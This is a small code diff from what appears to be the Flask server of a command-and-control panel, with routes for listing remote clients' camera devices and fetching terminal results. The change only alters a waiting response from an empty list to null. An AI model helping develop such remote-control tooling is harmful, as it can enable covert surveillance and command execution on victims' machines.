@@ -1066,8 +1066,8 @@ def c2_get_camera_devices(client_id):
             wsc = ws_clients.get(client_id)
         if wsc:
             wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': 'camera_list'}, separators=(',', ':')))
-        return jsonify([])
-    return jsonify(devices)
+        return jsonify(None)  # null = still waiting, client should retry
+    return jsonify(devices)  # [] = no cameras found, [...] = has devices
 @app.route('/api/c2/terminal_result/<client_id>')
 @login_required
 def c2_get_terminal_result(client_id):
